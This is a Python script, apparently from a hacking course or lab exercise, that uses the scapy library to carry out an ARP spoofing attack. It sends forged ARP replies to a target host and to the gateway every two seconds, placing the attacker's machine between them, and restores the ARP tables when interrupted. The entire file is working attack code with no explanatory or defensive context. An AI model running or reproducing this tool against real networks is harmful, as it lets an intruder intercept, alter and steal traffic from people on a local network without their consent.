import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    dst = 'ff:ff:ff:ff:ff:ff'
    broadcast = scapy.Ether(dst=dst)
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(
        arp_request_broadcast, timeout=1, verbose=False)[0]

    res = answered_list[0][1].hwsrc
    # print(res)
    return res


def spoof(target_ip, spoof_ip):

    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)
    # print(packet.show())
    # print(packet.summary())


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2,
                       pdst=destination_ip,
                       hwdst=destination_mac,
                       psrc=source_ip,
                       hwsrc=source_mac
                       )
    scapy.send(packet, count=4, verbose=False)
    # print(packet.show())
    # print(packet.summary())


if __name__ == '__main__':

    target_ip = '10.0.2.10'
    gateway_ip = '10.0.2.1'

    try:
        sent_packets_count = 0
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count += 2

            print(f'\r[+] Packets sent: {sent_packets_count}', end='')

            time.sleep(2)
    except KeyboardInterrupt:
        print('\r[+] Detected CTRL + C ..... Resetting ARP tables ..... Please wait.')

        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
